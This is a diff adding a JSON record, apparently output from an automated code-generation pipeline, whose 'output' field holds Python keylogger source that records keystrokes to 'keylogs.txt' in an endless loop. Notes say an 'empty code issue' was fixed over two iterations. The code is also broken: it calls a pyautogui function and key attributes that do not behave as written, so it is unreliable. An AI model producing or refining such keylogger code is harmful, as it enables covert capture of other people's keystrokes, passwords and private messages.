@@ -1,0 +1,8 @@
+{
+  "output": "\nimport pyautogui\n\nfile = open('keylogs.txt', 'w')\n\nwhile True:\n    key = pyautogui.keyPress()\n\n    if key.char:\n        file.write(key.char)\n    elif str(key) not in ['spacebar', 'enter']:\n        file.write(str(key))\n\n    print(key.char)\n\nfile.close()\n",
+  "notes": "Fixed empty code issue",
+  "applied_fixes": [
+    "iteration1_issue1"
+  ],
+  "iterations": 2
+}
